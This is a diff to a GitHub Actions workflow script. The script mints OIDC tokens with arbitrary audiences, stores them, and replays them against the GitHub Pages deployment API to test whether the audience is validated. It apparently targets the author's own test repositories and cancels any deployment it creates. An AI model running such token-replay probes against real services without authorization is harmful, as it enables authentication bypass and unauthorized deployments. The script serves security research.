@@ -34,62 +34,49 @@ jobs:
           mkdir -p /tmp/c10
           AUDS=("https://github.com/fox32932" "nobody" "x" "https://npm.pkg.github.com" "sigstore" "*")
           for AUD in "${AUDS[@]}"; do
-            SAFE=$(echo "$AUD" | tr -c 'a-zA-Z0-9' '_' | head -c 50)
+            SAFE="${AUD//[^a-zA-Z0-9]/_}"
+            [ -z "$SAFE" ] && SAFE="empty"
             echo "=== AUD='$AUD' SAFE=$SAFE ==="
             RESP=$(curl -sS -G --data-urlencode "audience=$AUD" -H "User-Agent: actions/oidc-client" -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL")
             echo "$RESP" > "/tmp/c10/oidc_resp_${SAFE}.json"
             TOK=$(echo "$RESP" | jq -r '.value // empty')
             if [ -n "$TOK" ]; then
               echo "$TOK" > "/tmp/c10/oidc_token_${SAFE}.jwt"
+              echo "issued: $SAFE"
+            else
+              echo "NO TOKEN: $RESP"
             fi
-            sleep 1
           done
 
           ARTIFACT_ID=$(curl -sS -H "Authorization: bearer $GH_TOKEN" "https://api.github.com/repos/fox32932/pages-test-cycle9/actions/runs/$GITHUB_RUN_ID/artifacts" | jq -r '.artifacts[] | select(.name=="github-pages") | .id')
           echo "artifact_id=$ARTIFACT_ID"
 
-          # Replay each forged-audience token against the SAME-repo deploy endpoint
-          # If the endpoint accepts a token whose aud != "https://github.com/fox32932",
-          # then deploy-pages does NOT validate audience.
+          # Baselines
+          echo "=== BASELINE no oidc_token ==="
+          BODY=$(jq -nc --arg v "c10-no-tok" --argjson aid "$ARTIFACT_ID" '{artifact_id:$aid, pages_build_version:$v}')
+          curl -sS -X POST -H "Authorization: bearer $GH_TOKEN" -H "Accept: application/vnd.github+json" "https://api.github.com/repos/fox32932/pages-test-cycle9/pages/deployment" -d "$BODY" -w "\nHTTP %{http_code}\n" > /tmp/c10/baseline_no_tok.txt
+          cat /tmp/c10/baseline_no_tok.txt
+
+          echo "=== BASELINE garbage oidc_token ==="
+          BODY=$(jq -nc --arg t "AAAA.BBBB.CCCC" --arg v "c10-garbage" --argjson aid "$ARTIFACT_ID" '{artifact_id:$aid, pages_build_version:$v, oidc_token:$t}')
+          curl -sS -X POST -H "Authorization: bearer $GH_TOKEN" -H "Accept: application/vnd.github+json" "https://api.github.com/repos/fox32932/pages-test-cycle9/pages/deployment" -d "$BODY" -w "\nHTTP %{http_code}\n" > /tmp/c10/baseline_garbage.txt
+          cat /tmp/c10/baseline_garbage.txt
+
+          # Replay each audience-token (cancel any successful deployment)
           for TF in /tmp/c10/oidc_token_*.jwt; do
             SAFE=$(basename "$TF" .jwt | sed 's/oidc_token_//')
-            if [ -f "$TF" ]; then
-              T=$(cat "$TF")
-              echo "=== Replay aud=$SAFE against pages/deployment ==="
-              BODY=$(jq -nc --arg t "$T" --arg v "c10-rep-$SAFE-$GITHUB_RUN_ID" --argjson aid "$ARTIFACT_ID" '{artifact_id:$aid, pages_build_version:$v, oidc_token:$t}')
-              curl -sS -X POST -H "Authorization: bearer $GH_TOKEN" -H "Accept: application/vnd.github+json" "https://api.github.com/repos/fox32932/pages-test-cycle9/pages/deployment" -d "$BODY" -w "\nHTTP %{http_code}\n" > "/tmp/c10/replay_${SAFE}.txt" 2>&1
-              echo "----RESPONSE----"; cat "/tmp/c10/replay_${SAFE}.txt"
-              # If a deployment was created, cancel it to avoid disturbing the actual page
-              DEPID=$(jq -r '.id // empty' "/tmp/c10/replay_${SAFE}.txt" 2>/dev/null)
-              if [ -n "$DEPID" ] && [ "$DEPID" != "null" ]; then
-                echo "Cancelling deployment $DEPID"
-                curl -sS -X PUT -H "Authorization: bearer $GH_TOKEN" -H "Accept: application/vnd.github+json" "https://api.github.com/repos/fox32932/pages-test-cycle9/pages/deployments/$DEPID/cancel" -w "\nHTTP %{http_code}\n" || true
-              fi
-              sleep 3
+            T=$(cat "$TF")
+            echo "=== REPLAY aud-safe=$SAFE ==="
+            BODY=$(jq -nc --arg t "$T" --arg v "c10-rep-$SAFE" --argjson aid "$ARTIFACT_ID" '{artifact_id:$aid, pages_build_version:$v, oidc_token:$t}')
+            curl -sS -X POST -H "Authorization: bearer $GH_TOKEN" -H "Accept: application/vnd.github+json" "https://api.github.com/repos/fox32932/pages-test-cycle9/pages/deployment" -d "$BODY" -w "\nHTTP %{http_code}\n" > "/tmp/c10/replay_${SAFE}.txt"
+            cat "/tmp/c10/replay_${SAFE}.txt"
+            DEPID=$(jq -r '.id // empty' "/tmp/c10/replay_${SAFE}.txt" 2>/dev/null)
+            if [ -n "$DEPID" ] && [ "$DEPID" != "null" ]; then
+              echo "Cancelling deployment $DEPID"
+              curl -sS -X PUT -H "Authorization: bearer $GH_TOKEN" -H "Accept: application/vnd.github+json" "https://api.github.com/repos/fox32932/pages-test-cycle9/pages/deployments/$DEPID/cancel" -w "\nHTTP %{http_code}\n" >> "/tmp/c10/replay_${SAFE}.txt"
             fi
+            sleep 1
           done
-
-          # Also try deploy-pages on repo B (cross-repo) — GITHUB_TOKEN of A doesn't have rights to B,
-          # so this should 404, but log for completeness
-          echo "=== Cross-repo replay against pages-test-cycle9-b (expect 404 due to GITHUB_TOKEN scope) ==="
-          T=$(cat /tmp/c10/oidc_token_nobody_.jwt 2>/dev/null)
-          if [ -n "$T" ]; then
-            BODY=$(jq -nc --arg t "$T" --arg v "c10-cross" --argjson aid "$ARTIFACT_ID" '{artifact_id:$aid, pages_build_version:$v, oidc_token:$t}')
-            curl -sS -X POST -H "Authorization: bearer $GH_TOKEN" -H "Accept: application/vnd.github+json" "https://api.github.com/repos/fox32932/pages-test-cycle9-b/pages/deployment" -d "$BODY" -w "\nHTTP %{http_code}\n" > /tmp/c10/replay_crossrepo.txt 2>&1
-            cat /tmp/c10/replay_crossrepo.txt
-          fi
-
-          # And try with NO oidc_token (should fail if token required)
-          echo "=== Replay with NO oidc_token field ==="
-          BODY=$(jq -nc --arg v "c10-no-oidc" --argjson aid "$ARTIFACT_ID" '{artifact_id:$aid, pages_build_version:$v}')
-          curl -sS -X POST -H "Authorization: bearer $GH_TOKEN" -H "Accept: application/vnd.github+json" "https://api.github.com/repos/fox32932/pages-test-cycle9/pages/deployment" -d "$BODY" -w "\nHTTP %{http_code}\n" > /tmp/c10/replay_no_token.txt 2>&1
-          cat /tmp/c10/replay_no_token.txt
-
-          # And try with INVALID oidc_token (totally bogus string)
-          echo "=== Replay with invalid oidc_token ==="
-          BODY=$(jq -nc --arg t "garbage.token.here" --arg v "c10-invalid-tok" --argjson aid "$ARTIFACT_ID" '{artifact_id:$aid, pages_build_version:$v, oidc_token:$t}')
-          curl -sS -X POST -H "Authorization: bearer $GH_TOKEN" -H "Accept: application/vnd.github+json" "https://api.github.com/repos/fox32932/pages-test-cycle9/pages/deployment" -d "$BODY" -w "\nHTTP %{http_code}\n" > /tmp/c10/replay_garbage_token.txt 2>&1
-          cat /tmp/c10/replay_garbage_token.txt
 
           tar czf /tmp/c10_artifacts.tar.gz -C /tmp c10
           ls -la /tmp/c10_artifacts.tar.gz
